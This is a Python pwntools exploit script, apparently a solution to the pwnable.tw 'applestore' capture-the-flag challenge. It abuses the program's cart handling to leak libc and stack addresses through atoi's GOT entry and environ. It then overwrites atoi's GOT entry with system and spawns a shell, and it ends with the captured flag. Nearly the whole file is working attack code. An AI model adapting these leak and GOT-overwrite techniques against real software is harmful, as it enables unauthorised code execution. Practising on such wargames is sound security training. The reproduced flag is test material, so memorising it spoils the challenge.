from pwn import *
# context(arch='i386', os='linux', log_level='debug')
elf = ELF("./applestore")
# libc = ELF("libc_32.so.6")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
p = elf.process()
# p = remote('chall.pwnable.tw', 10104)

def add(idx):
	p.sendlineafter("> ", str(2))
	p.sendlineafter("Device Number> ", str(idx))

def delete(idx):
	p.sendlineafter("> ", str(3))
	p.sendlineafter("Item Number> ", idx)

def cart(con):
	p.sendlineafter("> ", str(4))
	p.sendlineafter("Let me check your cart. ok? (y/n) > ", con)

def checkout(con):
	p.sendlineafter("> ", str(5))
	p.sendlineafter("Let me check your cart. ok? (y/n) > ", con)

atoi_got = elf.got['atoi']
info("atoi_got:" + hex(atoi_got))

for i in range(6):
	add(1)

for i in range(20):
	add(2)
checkout('y')

payload = 'y\x00' + p32(atoi_got) + p32(0) + p32(0)
cart(payload)

p.recvuntil("27: ")
libc_base = u32(p.recv(4)) - libc.symbols['atoi']
libc.address = libc_base
system = libc.symbols['system']
environ = libc.symbols['environ']
info("environ:" + hex(environ))
info("libc_base:" + hex(libc_base))
info("system:" + hex(system))

payload = 'y\x00' + p32(environ) + p32(0) + p32(0)
cart(payload)
p.recvuntil("27: ")
ebp = u32(p.recv(4)) - 0x104
info("ebp_addr:" + hex(ebp))

payload = '27' + p32(0) + p32(0) + p32(atoi_got + 0x22) + p32(ebp - 0x8)
# gdb.attach(p)
delete(payload)
p.sendlineafter("> ", p32(system) + ";sh\x00")

p.interactive()

# FLAG{I_th1nk_th4t_you_c4n_jB_1n_1ph0n3_8}
# pwned by Ld1ng